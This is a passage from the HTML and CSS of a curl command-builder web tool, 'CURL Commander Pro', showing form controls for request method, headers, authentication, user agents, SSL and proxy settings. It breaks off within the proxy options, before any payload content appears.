<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CURL Commander Pro - Advanced HTTP Testing Tool</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #6366f1;
            --primary-hover: #5b5fd8;
            --primary-light: #f0f0ff;
            --secondary: #f59e0b;
            --success: #10b981;
            --danger: #ef4444;
            --warning: #f59e0b;
            --info: #3b82f6;
            --dark: #1f2937;
            --light: #ffffff;
            --gray-50: #f9fafb;
            --gray-100: #f3f4f6;
            --gray-200: #e5e7eb;
            --gray-300: #d1d5db;
            --gray-400: #9ca3af;
            --gray-500: #6b7280;
            --gray-600: #4b5563;
            --gray-700: #374151;
            --gray-800: #1f2937;
            --gray-900: #111827;
            --border-radius: 12px;
            --shadow-sm: 0 1px 2px 0 rgb(0 0 0 / 0.05);
            --shadow: 0 1px 3px 0 rgb(0 0 0 / 0.1), 0 1px 2px -1px rgb(0 0 0 / 0.1);
            --shadow-lg: 0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);
            --shadow-xl: 0 20px 25px -5px rgb(0 0 0 / 0.1), 0 8px 10px -6px rgb(0 0 0 / 0.1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: linear-gradient(135deg, var(--gray-50) 0%, var(--gray-100) 100%);
            color: var(--gray-800);
            line-height: 1.6;
            min-height: 100vh;
        }

        .header {
            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-hover) 100%);
            color: white;
            padding: 1.5rem 0;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: var(--shadow-lg);
        }

        .container {
            max-width: 1600px;
            margin: 0 auto;
            padding: 0 1.5rem;
        }

        .header-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 1rem;
        }

        .logo-icon {
            width: 48px;
            height: 48px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: var(--border-radius);
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 1.5rem;
            backdrop-filter: blur(10px);
        }

        .logo-text h1 {
            font-size: 1.75rem;
            font-weight: 800;
            margin-bottom: 0.25rem;
        }

        .logo-text .subtitle {
            font-size: 0.875rem;
            opacity: 0.9;
            font-weight: 400;
        }

        .header-actions {
            display: flex;
            gap: 1rem;
            align-items: center;
        }

        .main-content {
            padding: 2rem 0;
            min-height: calc(100vh - 200px);
        }

        .grid {
            display: grid;
            grid-template-columns: 1fr 400px;
            gap: 2rem;
        }

        @media (max-width: 1200px) {
            .grid {
                grid-template-columns: 1fr;
            }
        }

        .card {
            background: white;
            border-radius: var(--border-radius);
            box-shadow: var(--shadow);
            overflow: hidden;
            margin-bottom: 1.5rem;
            border: 1px solid var(--gray-200);
        }

        .card-header {
            padding: 1.5rem;
            background: var(--gray-50);
            border-bottom: 1px solid var(--gray-200);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .card-title {
            font-size: 1.125rem;
            font-weight: 600;
            color: var(--gray-800);
            display: flex;
            align-items: center;
            gap: 0.75rem;
        }

        .card-title .icon {
            width: 24px;
            height: 24px;
            color: var(--primary);
        }

        .card-body {
            padding: 1.5rem;
        }

        .form-group {
            margin-bottom: 1.5rem;
        }

        .form-label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 500;
            color: var(--gray-700);
            font-size: 0.875rem;
        }

        .form-description {
            display: block;
            margin-bottom: 0.75rem;
            font-size: 0.75rem;
            color: var(--gray-500);
            line-height: 1.4;
        }

        .form-input, .form-select {
            width: 100%;
            padding: 0.75rem 1rem;
            border: 2px solid var(--gray-200);
            border-radius: 8px;
            font-size: 0.875rem;
            transition: all 0.2s ease;
            background: white;
        }

        .form-input:focus, .form-select:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
        }

        .form-textarea {
            width: 100%;
            padding: 0.75rem 1rem;
            border: 2px solid var(--gray-200);
            border-radius: 8px;
            font-size: 0.875rem;
            font-family: 'Monaco', 'Consolas', 'SF Mono', monospace;
            resize: vertical;
            min-height: 120px;
            transition: all 0.2s ease;
        }

        .form-textarea:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
        }

        .method-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(80px, 1fr));
            gap: 0.5rem;
        }

        .method-btn {
            padding: 0.75rem;
            border: 2px solid var(--gray-200);
            background: white;
            border-radius: 8px;
            font-weight: 600;
            color: var(--gray-600);
            cursor: pointer;
            transition: all 0.2s ease;
            font-size: 0.875rem;
            text-align: center;
        }

        .method-btn:hover {
            border-color: var(--primary);
            color: var(--primary);
            transform: translateY(-1px);
        }

        .method-btn.active {
            background: var(--primary);
            border-color: var(--primary);
            color: white;
            box-shadow: var(--shadow);
        }

        .btn {
            padding: 0.75rem 1.25rem;
            border: none;
            border-radius: 8px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s ease;
            font-size: 0.875rem;
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            text-decoration: none;
            border: 2px solid transparent;
        }

        .btn:hover {
            transform: translateY(-1px);
        }

        .btn-primary {
            background: var(--primary);
            color: white;
        }

        .btn-primary:hover {
            background: var(--primary-hover);
            box-shadow: var(--shadow-lg);
        }

        .btn-secondary {
            background: var(--gray-100);
            color: var(--gray-700);
            border-color: var(--gray-200);
        }

        .btn-secondary:hover {
            background: var(--gray-200);
        }

        .btn-success {
            background: var(--success);
            color: white;
        }

        .btn-success:hover {
            background: #059669;
            box-shadow: var(--shadow-lg);
        }

        .btn-warning {
            background: var(--warning);
            color: white;
        }

        .btn-warning:hover {
            background: #d97706;
        }

        .btn-danger {
            background: var(--danger);
            color: white;
        }

        .btn-danger:hover {
            background: #dc2626;
        }

        .btn-info {
            background: var(--info);
            color: white;
        }

        .btn-info:hover {
            background: #2563eb;
        }

        .btn-sm {
            padding: 0.5rem 1rem;
            font-size: 0.75rem;
        }

        .btn-lg {
            padding: 1rem 1.5rem;
            font-size: 1rem;
        }

        .header-row {
            display: grid;
            grid-template-columns: 1fr 1fr auto;
            gap: 0.5rem;
            margin-bottom: 0.75rem;
            align-items: center;
        }

        .header-input {
            padding: 0.625rem 0.875rem;
            border: 2px solid var(--gray-200);
            border-radius: 6px;
            font-size: 0.875rem;
            transition: all 0.2s ease;
        }

        .header-input:focus {
            outline: none;
            border-color: var(--primary);
        }

        .options-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 1.5rem;
        }

        .checkbox-group {
            display: grid;
            gap: 0.75rem;
        }

        .checkbox-item {
            display: flex;
            align-items: flex-start;
            gap: 0.75rem;
            cursor: pointer;
            padding: 0.75rem;
            border-radius: 8px;
            transition: all 0.2s ease;
        }

        .checkbox-item:hover {
            background: var(--gray-50);
        }

        .checkbox-item input[type="checkbox"] {
            margin-top: 0.125rem;
            width: 16px;
            height: 16px;
            accent-color: var(--primary);
        }

        .checkbox-content {
            flex: 1;
        }

        .checkbox-label {
            font-weight: 500;
            color: var(--gray-700);
            margin-bottom: 0.25rem;
        }

        .checkbox-description {
            font-size: 0.75rem;
            color: var(--gray-500);
            line-height: 1.4;
        }

        .input-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 0.75rem;
            align-items: center;
        }

        .collapsible {
            border: 2px solid var(--gray-200);
            border-radius: var(--border-radius);
            margin-bottom: 1.5rem;
            overflow: hidden;
            transition: all 0.2s ease;
        }

        .collapsible:hover {
            border-color: var(--gray-300);
        }

        .collapsible.active {
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
        }

        .collapsible-header {
            padding: 1.25rem;
            background: var(--gray-50);
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-weight: 500;
            color: var(--gray-700);
            transition: all 0.2s ease;
        }

        .collapsible-header:hover {
            background: var(--gray-100);
        }

        .collapsible.active .collapsible-header {
            background: var(--primary-light);
            color: var(--primary);
        }

        .collapsible-title {
            display: flex;
            align-items: center;
            gap: 0.75rem;
        }

        .collapsible-content {
            padding: 0;
            max-height: 0;
            overflow: hidden;
            transition: all 0.3s ease;
        }

        .collapsible.active .collapsible-content {
            max-height: 1000px;
            padding: 1.5rem;
        }

        .collapsible-icon {
            transition: transform 0.2s ease;
            color: var(--gray-400);
        }

        .collapsible.active .collapsible-icon {
            transform: rotate(180deg);
            color: var(--primary);
        }

        .preset-buttons {
            display: flex;
            gap: 0.5rem;
            margin-bottom: 1rem;
            flex-wrap: wrap;
        }

        .preset-btn {
            padding: 0.5rem 1rem;
            background: var(--gray-100);
            border: 2px solid var(--gray-200);
            border-radius: 20px;
            font-size: 0.75rem;
            font-weight: 500;
            color: var(--gray-600);
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .preset-btn:hover {
            background: var(--primary-light);
            border-color: var(--primary);
            color: var(--primary);
        }

        .payload-search {
            position: relative;
            margin-bottom: 1rem;
        }

        .payload-search-input {
            width: 100%;
            padding: 0.75rem 1rem 0.75rem 2.5rem;
            border: 2px solid var(--gray-200);
            border-radius: 8px;
            font-size: 0.875rem;
            transition: all 0.2s ease;
        }

        .payload-search-input:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
        }

        .payload-search-icon {
            position: absolute;
            left: 0.875rem;
            top: 50%;
            transform: translateY(-50%);
            color: var(--gray-400);
        }

        .payload-categories {
            display: flex;
            gap: 0.5rem;
            margin-bottom: 1rem;
            flex-wrap: wrap;
        }

        .payload-cat-btn {
            padding: 0.5rem 1rem;
            border: 2px solid var(--gray-200);
            background: white;
            border-radius: 20px;
            font-size: 0.75rem;
            font-weight: 500;
            color: var(--gray-600);
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .payload-cat-btn:hover {
            border-color: var(--primary);
            color: var(--primary);
            transform: translateY(-1px);
        }

        .payload-cat-btn.active {
            background: var(--primary);
            border-color: var(--primary);
            color: white;
            box-shadow: var(--shadow);
        }

        .payload-list {
            max-height: 500px;
            overflow-y: auto;
            border: 2px solid var(--gray-200);
            border-radius: 8px;
            background: white;
        }

        .payload-item {
            padding: 1rem;
            border-bottom: 1px solid var(--gray-200);
            display: flex;
            justify-content: space-between;
            align-items: center;
            transition: all 0.2s ease;
        }

        .payload-item:hover {
            background: var(--gray-50);
        }

        .payload-item:last-child {
            border-bottom: none;
        }

        .payload-text {
            font-family: 'Monaco', 'Consolas', 'SF Mono', monospace;
            font-size: 0.75rem;
            color: var(--gray-700);
            flex: 1;
            word-break: break-all;
            margin-right: 1rem;
            max-height: 4em;
            overflow: hidden;
            line-height: 1.5;
            background: var(--gray-50);
            padding: 0.5rem;
            border-radius: 4px;
        }

        .payload-actions {
            display: flex;
            gap: 0.5rem;
            flex-shrink: 0;
        }

        .output-textarea {
            width: 100%;
            padding: 1.25rem;
            border: 2px solid var(--gray-200);
            border-radius: var(--border-radius);
            font-family: 'Monaco', 'Consolas', 'SF Mono', monospace;
            font-size: 0.875rem;
            min-height: 200px;
            resize: vertical;
            background: var(--gray-50);
            line-height: 1.6;
        }

        .toast {
            position: fixed;
            bottom: 2rem;
            right: 2rem;
            background: var(--gray-800);
            color: white;
            padding: 1rem 1.5rem;
            border-radius: var(--border-radius);
            box-shadow: var(--shadow-xl);
            display: none;
            align-items: center;
            gap: 0.75rem;
            animation: slideIn 0.3s ease;
            z-index: 1000;
            max-width: 400px;
        }

        .toast.show {
            display: flex;
        }

        .toast.success {
            background: var(--success);
        }

        .toast.warning {
            background: var(--warning);
        }

        .toast.error {
            background: var(--danger);
        }

        .toast.info {
            background: var(--info);
        }

        @keyframes slideIn {
            from {
                transform: translateX(100%);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }

        .badge {
            display: inline-block;
            padding: 0.25rem 0.5rem;
            font-size: 0.75rem;
            font-weight: 500;
            line-height: 1;
            text-align: center;
            white-space: nowrap;
            vertical-align: baseline;
            border-radius: 0.375rem;
            margin-left: 0.5rem;
        }

        .badge-primary {
            background: var(--primary);
            color: white;
        }

        .badge-success {
            background: var(--success);
            color: white;
        }

        .quick-start {
            background: linear-gradient(135deg, var(--primary-light) 0%, #fef3c7 100%);
            border: 2px solid var(--primary);
            border-radius: var(--border-radius);
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .quick-start-title {
            font-size: 1.125rem;
            font-weight: 600;
            color: var(--primary);
            margin-bottom: 0.75rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .quick-start-steps {
            font-size: 0.875rem;
            color: var(--gray-700);
            line-height: 1.6;
        }

        .step {
            margin-bottom: 0.5rem;
            display: flex;
            align-items: flex-start;
            gap: 0.5rem;
        }

        .step-number {
            background: var(--primary);
            color: white;
            width: 20px;
            height: 20px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0.75rem;
            font-weight: 600;
            flex-shrink: 0;
            margin-top: 0.125rem;
        }

        .template-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 1rem;
            margin-bottom: 1.5rem;
        }

        .template-card {
            padding: 1rem;
            border: 2px solid var(--gray-200);
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.2s ease;
            text-align: center;
        }

        .template-card:hover {
            border-color: var(--primary);
            background: var(--primary-light);
            transform: translateY(-2px);
        }

        .template-icon {
            font-size: 1.5rem;
            color: var(--primary);
            margin-bottom: 0.5rem;
        }

        .template-title {
            font-weight: 600;
            color: var(--gray-700);
            margin-bottom: 0.25rem;
        }

        .template-description {
            font-size: 0.75rem;
            color: var(--gray-500);
        }

        .help-tip {
            background: var(--info);
            color: white;
            padding: 0.75rem 1rem;
            border-radius: 8px;
            font-size: 0.875rem;
            margin-bottom: 1rem;
            display: flex;
            align-items: flex-start;
            gap: 0.75rem;
        }

        .help-tip .icon {
            flex-shrink: 0;
            margin-top: 0.125rem;
        }

        .scrollbar-custom {
            scrollbar-width: thin;
            scrollbar-color: var(--gray-300) var(--gray-100);
        }

        .scrollbar-custom::-webkit-scrollbar {
            width: 6px;
        }

        .scrollbar-custom::-webkit-scrollbar-track {
            background: var(--gray-100);
            border-radius: 3px;
        }

        .scrollbar-custom::-webkit-scrollbar-thumb {
            background: var(--gray-300);
            border-radius: 3px;
        }

        .scrollbar-custom::-webkit-scrollbar-thumb:hover {
            background: var(--gray-400);
        }

        .modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            backdrop-filter: blur(4px);
        }

        .modal.show {
            display: flex;
        }

        .modal-content {
            background: white;
            border-radius: var(--border-radius);
            padding: 2rem;
            max-width: 600px;
            width: 90%;
            max-height: 80vh;
            overflow-y: auto;
            box-shadow: var(--shadow-xl);
        }

        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1.5rem;
            padding-bottom: 1rem;
            border-bottom: 2px solid var(--gray-200);
        }

        .modal-title {
            font-size: 1.25rem;
            font-weight: 600;
            color: var(--gray-800);
        }

        .modal-close {
            background: none;
            border: none;
            font-size: 1.5rem;
            cursor: pointer;
            color: var(--gray-400);
            padding: 0.5rem;
            border-radius: 50%;
            transition: all 0.2s ease;
        }

        .modal-close:hover {
            background: var(--gray-100);
            color: var(--gray-600);
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .container {
                padding: 0 1rem;
            }
            
            .header-content {
                flex-direction: column;
                gap: 1rem;
                text-align: center;
            }
            
            .options-grid {
                grid-template-columns: 1fr;
            }
            
            .input-row {
                grid-template-columns: 1fr;
            }
            
            .method-grid {
                grid-template-columns: repeat(2, 1fr);
            }
            
            .payload-categories {
                justify-content: center;
            }
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="container header-content">
            <div class="logo">
                <div class="logo-icon">
                    <i class="fas fa-terminal"></i>
                </div>
                <div class="logo-text">
                    <h1>CURL Commander Pro</h1>
                    <div class="subtitle">Professional HTTP Testing & Security Analysis Tool</div>
                </div>
            </div>
            <div class="header-actions">
                <button id="templates-btn" class="btn btn-secondary btn-sm">
                    <i class="fas fa-layer-group"></i> Templates
                </button>
                <button id="help-btn" class="btn btn-secondary btn-sm">
                    <i class="fas fa-question-circle"></i> Help & Guide
                </button>
                <button id="reset-all-btn" class="btn btn-warning btn-sm">
                    <i class="fas fa-undo"></i> Reset All
                </button>
            </div>
        </div>
    </header>

    <main class="main-content container">
        <!-- Quick Start Guide -->
        <div class="quick-start">
            <div class="quick-start-title">
                <i class="fas fa-rocket"></i>
                Quick Start Guide
            </div>
            <div class="quick-start-steps">
                <div class="step">
                    <div class="step-number">1</div>
                    <div>Enter your target URL and select HTTP method</div>
                </div>
                <div class="step">
                    <div class="step-number">2</div>
                    <div>Configure headers, authentication, and options as needed</div>
                </div>
                <div class="step">
                    <div class="step-number">3</div>
                    <div>Choose a security payload from our comprehensive library</div>
                </div>
                <div class="step">
                    <div class="step-number">4</div>
                    <div>Copy the generated CURL command and run it in your terminal</div>
                </div>
            </div>
        </div>

        <div class="grid">
            <!-- Left Panel - CURL Builder -->
            <div>
                <!-- Basic Request Configuration -->
                <div class="card">
                    <div class="card-header">
                        <div class="card-title">
                            <i class="fas fa-globe icon"></i>
                            Basic Request Configuration
                        </div>
                        <div style="display: flex; gap: 0.5rem;">
                            <button id="generate-btn" class="btn btn-primary btn-sm">
                                <i class="fas fa-magic"></i> Generate Command
                            </button>
                            <button id="save-command-btn" class="btn btn-success btn-sm">
                                <i class="fas fa-bookmark"></i> Save
                            </button>
                        </div>
                    </div>
                    <div class="card-body">
                        <!-- HTTP Method Selection -->
                        <div class="form-group">
                            <label class="form-label">HTTP Method</label>
                            <span class="form-description">Choose the HTTP method for your request. GET for retrieving data, POST for sending data, PUT for updates, etc.</span>
                            <div class="method-grid">
                                <button class="method-btn active" data-method="GET" title="Retrieve data from server">GET</button>
                                <button class="method-btn" data-method="POST" title="Send data to server">POST</button>
                                <button class="method-btn" data-method="PUT" title="Update existing resource">PUT</button>
                                <button class="method-btn" data-method="DELETE" title="Delete resource">DELETE</button>
                                <button class="method-btn" data-method="PATCH" title="Partial update">PATCH</button>
                                <button class="method-btn" data-method="HEAD" title="Get headers only">HEAD</button>
                                <button class="method-btn" data-method="OPTIONS" title="Check allowed methods">OPTIONS</button>
                            </div>
                        </div>

                        <!-- URL Input -->
                        <div class="form-group">
                            <label for="url" class="form-label">Target URL</label>
                            <span class="form-description">Enter the complete URL you want to test. Include protocol (http/https) and any path parameters.</span>
                            <input type="text" id="url" class="form-input" placeholder="https://api.example.com/v1/users" value="https://api.example.com/v1/test">
                        </div>

                        <!-- Request Body -->
                        <div class="form-group">
                            <label class="form-label">Request Body</label>
                            <span class="form-description">Add JSON, XML, form data, or raw content. Use the payload library for security testing payloads.</span>
                            <textarea id="body" class="form-textarea" placeholder='{"username": "test", "data": "payload_here"}'></textarea>
                            <div style="margin-top: 0.75rem; display: flex; gap: 0.5rem; flex-wrap: wrap;">
                                <button id="format-json-btn" class="btn btn-secondary btn-sm">
                                    <i class="fas fa-code"></i> Format JSON
                                </button>
                                <button id="encode-body-btn" class="btn btn-secondary btn-sm">
                                    <i class="fas fa-lock"></i> URL Encode
                                </button>
                                <button id="decode-body-btn" class="btn btn-secondary btn-sm">
                                    <i class="fas fa-unlock"></i> URL Decode
                                </button>
                                <button id="base64-encode-btn" class="btn btn-secondary btn-sm">
                                    <i class="fas fa-shield-alt"></i> Base64 Encode
                                </button>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Headers Configuration -->
                <div class="collapsible">
                    <div class="collapsible-header">
                        <div class="collapsible-title">
                            <i class="fas fa-list-ul"></i>
                            HTTP Headers
                        </div>
                        <i class="fas fa-chevron-down collapsible-icon"></i>
                    </div>
                    <div class="collapsible-content">
                        <div class="help-tip">
                            <i class="fas fa-info-circle icon"></i>
                            <div>Headers provide additional information about your request. Common headers include Content-Type, Authorization, User-Agent, and custom API headers.</div>
                        </div>
                        
                        <div class="preset-buttons">
                            <button class="preset-btn" data-preset="json">
                                <i class="fas fa-code"></i> JSON Headers
                            </button>
                            <button class="preset-btn" data-preset="form">
                                <i class="fas fa-wpforms"></i> Form Headers
                            </button>
                            <button class="preset-btn" data-preset="xml">
                                <i class="fas fa-file-code"></i> XML Headers
                            </button>
                        </div>

                        <div id="headers-container">
                            <div class="header-row">
                                <input type="text" class="header-input header-name" placeholder="Header name" value="Content-Type">
                                <input type="text" class="header-input header-value" placeholder="Header value" value="application/json">
                                <button class="btn btn-sm btn-danger remove-header" title="Remove this header">
                                    <i class="fas fa-trash"></i>
                                </button>
                            </div>
                        </div>
                        <button id="add-header-btn" class="btn btn-sm btn-secondary" style="margin-top: 0.75rem;">
                            <i class="fas fa-plus"></i> Add Header
                        </button>
                    </div>
                </div>

                <!-- Authentication -->
                <div class="collapsible">
                    <div class="collapsible-header">
                        <div class="collapsible-title">
                            <i class="fas fa-user-shield"></i>
                            Authentication & Security
                        </div>
                        <i class="fas fa-chevron-down collapsible-icon"></i>
                    </div>
                    <div class="collapsible-content">
                        <div class="help-tip">
                            <i class="fas fa-shield-alt icon"></i>
                            <div>Configure authentication methods to access protected endpoints. Choose the method that matches your API's requirements.</div>
                        </div>

                        <div class="form-group">
                            <label class="form-label">Authentication Type</label>
                            <span class="form-description">Select the authentication method required by your target API or service.</span>
                            <select id="auth-type" class="form-select">
                                <option value="">No Authentication</option>
                                <option value="basic">Basic Authentication (Username/Password)</option>
                                <option value="bearer">Bearer Token (OAuth/JWT)</option>
                                <option value="api-key">API Key (Custom Header)</option>
                                <option value="digest">Digest Authentication</option>
                                <option value="oauth1">OAuth 1.0</option>
                                <option value="ntlm">NTLM Authentication</option>
                                <option value="aws">AWS Signature</option>
                            </select>
                        </div>
                        <div id="auth-fields"></div>
                    </div>
                </div>

                <!-- Connection & Network Options -->
                <div class="collapsible">
                    <div class="collapsible-header">
                        <div class="collapsible-title">
                            <i class="fas fa-network-wired"></i>
                            Connection & Network Options
                        </div>
                        <i class="fas fa-chevron-down collapsible-icon"></i>
                    </div>
                    <div class="collapsible-content">
                        <div class="options-grid">
                            <div class="form-group">
                                <label class="form-label">User Agent</label>
                                <span class="form-description">Specify which browser or client to impersonate.</span>
                                <select id="user-agent" class="form-select">
                                    <option value="">Default CURL Agent</option>
                                    <option value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36">Chrome (Windows)</option>
                                    <option value="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36">Chrome (macOS)</option>
                                    <option value="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36">Chrome (Linux)</option>
                                    <option value="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0">Firefox (Windows)</option>
                                    <option value="Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1">Safari (iPhone)</option>
                                    <option value="Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)">Googlebot</option>
                                    <option value="custom">Custom User Agent</option>
                                </select>
                                <input type="text" id="custom-user-agent" class="form-input" placeholder="Enter custom User-Agent string" style="margin-top: 0.5rem; display: none;">
                            </div>

                            <div class="form-group">
                                <label class="form-label">Request Timeout</label>
                                <span class="form-description">Maximum time to wait for response (seconds).</span>
                                <input type="number" id="timeout" class="form-input" placeholder="30" min="1" max="3600" value="30">
                            </div>
                        </div>

                        <div class="options-grid">
                            <div class="form-group">
                                <label class="form-label">Max Redirects</label>
                                <span class="form-description">Maximum number of redirects to follow.</span>
                                <input type="number" id="max-redirects" class="form-input" placeholder="5" min="0" max="50" value="5">
                            </div>

                            <div class="form-group">
                                <label class="form-label">Retry Attempts</label>
                                <span class="form-description">Number of times to retry failed requests.</span>
                                <input type="number" id="retry" class="form-input" placeholder="0" min="0" max="10" value="0">
                            </div>
                        </div>

                        <div class="options-grid">
                            <div class="form-group">
                                <label class="form-label">Connect Timeout</label>
                                <span class="form-description">Maximum time to establish connection (seconds).</span>
                                <input type="number" id="connect-timeout" class="form-input" placeholder="10" min="1" max="300" value="10">
                            </div>

                            <div class="form-group">
                                <label class="form-label">Rate Limit</label>
                                <span class="form-description">Delay between requests (milliseconds).</span>
                                <input type="number" id="rate-limit" class="form-input" placeholder="0" min="0" max="10000">
                            </div>
                        </div>
                    </div>
                </div>

                <!-- SSL & Security Options -->
                <div class="collapsible">
                    <div class="collapsible-header">
                        <div class="collapsible-title">
                            <i class="fas fa-shield-alt"></i>
                            SSL & Security Options
                        </div>
                        <i class="fas fa-chevron-down collapsible-icon"></i>
                    </div>
                    <div class="collapsible-content">
                        <div class="checkbox-group">
                            <label class="checkbox-item">
                                <input type="checkbox" id="opt-insecure">
                                <div class="checkbox-content">
                                    <div class="checkbox-label">Ignore SSL Certificate Errors (-k)</div>
                                    <div class="checkbox-description">Skip SSL certificate verification. Useful for testing with self-signed certificates.</div>
                                </div>
                            </label>

                            <label class="checkbox-item">
                                <input type="checkbox" id="opt-cert-status">
                                <div class="checkbox-content">
                                    <div class="checkbox-label">Verify Certificate Status (--cert-status)</div>
                                    <div class="checkbox-description">Tell curl to verify the status of the server certificate using the Certificate Status Request TLS extension.</div>
                                </div>
                            </label>

                            <label class="checkbox-item">
                                <input type="checkbox" id="opt-http2">
                                <div class="checkbox-content">
                                    <div class="checkbox-label">Force HTTP/2 (--http2)</div>
                                    <div class="checkbox-description">Use HTTP/2 protocol for the request when possible.</div>
                                </div>
                            </label>

                            <label class="checkbox-item">
                                <input type="checkbox" id="opt-http3">
                                <div class="checkbox-content">
                                    <div class="checkbox-label">Force HTTP/3 (--http3)</div>
                                    <div class="checkbox-description">Use HTTP/3 protocol for the request when available.</div>
                                </div>
                            </label>
                        </div>

                        <div class="options-grid" style="margin-top: 1.5rem;">
                            <div class="form-group">
                                <label class="form-label">CA Certificate Bundle</label>
                                <span class="form-description">Path to custom CA certificate bundle file.</span>
                                <input type="text" id="cacert" class="form-input" placeholder="/path/to/ca-bundle.crt">
                            </div>

                            <div class="form-group">
                                <label class="form-label">Client Certificate</label>
                                <span class="form-description">Path to client certificate file for mutual TLS.</span>
                                <input type="text" id="cert" class="form-input" placeholder="/path/to/client.crt">
                            </div>
                        </div>

                        <div class="options-grid">
                            <div class="form-group">
                                <label class="form-label">Private Key</label>
                                <span class="form-description">Path to private key file for client certificate.</span>
                                <input type="text" id="key" class="form-input" placeholder="/path/to/private.key">
                            </div>

                            <div class="form-group">
                                <label class="form-label">TLS Version</label>
                                <span class="form-description">Specify minimum TLS version to use.</span>
                                <select id="tls-version" class="form-select">
                                    <option value="">Default</option>
                                    <option value="--tlsv1">TLS 1.0+</option>
                                    <option value="--tlsv1.1">TLS 1.1+</option>
                                    <option value="--tlsv1.2">TLS 1.2+</option>
                                    <option value="--tlsv1.3">TLS 1.3+</option>
                                </select>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Proxy & Network Configuration -->
                <div class="collapsible">
                    <div class="collapsible-header">
                        <div class="collapsible-title">
                            <i class="fas fa-server"></i>
                            Proxy & Network Configuration
                        </div>
                        <i class="fas fa-chevron-down collapsible-icon"></i>
                    </div>
                    <div class="collapsible-content">
                        <div class="help-tip">
                            <i class="fas fa-route icon"></i>
                            <div>Route your requests through proxy servers for testing, anonymity, or to bypass network restrictions. Supports HTTP, HTTPS, and SOCKS proxies.</div>
                        </div>

                        <div class="options-grid">
                            <div class="form-group">
                                <label class="form-label">HTTP/HTTPS Proxy</label>
                                <span class="form-description">Route requests through HTTP proxy server.</span>
                                <input type="text" id="proxy" class="form-input" placeholder="http://proxy.example.com:8080">
                            </div>

                            <div class="form-group">
                                <label class="form-label">SOCKS Proxy</label>
                                <span class="form-description">Use SOCKS4/SOCKS5 proxy for connections.</span>
                                <input type="text" id="socks-proxy" class="form-input" placeholder="socks5://proxy.example.com:1080">
                            </div>
                        </div>

                        <div class="options-grid">
                            <div class="form-group">
                                <label class="form-label">Proxy Authentication</label>
                                <span class="form-description">Username and password for proxy authentication.</span>
                                <input type="text" id="proxy-user" class="form-input" placeholder="username:password">
                            </div>

                            <div class="form-group">
                                <label class="form-label">Network Interface</label>
                                <span class="form-description">Bind to specific network interface or IP address.</span>
                                <input type="text" id="interface" class="form-input" placeholder="eth0 or 192.168.1.100">
                            </div>
                        </div>

                        <div class="checkbox-group" style="margin-top: 1rem;">
                            <label class="checkbox-item">
                                <input type="checkbox" id="opt-proxy-tunnel">
                                <div class="checkbox-content">
                                    <div class="checkbox-label">Proxy Tunnel (--proxytunnel)</div>
                                    <div class="checkbox-description">Use HTTP CONNECT method to tunnel through proxy.</div>
                                </div>
                            </label>

                            <label class="checkbox-item">
                                <input type="checkbox" id="opt-proxy-insecure">
                                <div class="checkbox-content">
                                    <div class="checkbox-label">Proxy Insecure (--proxy-insecure)</div>
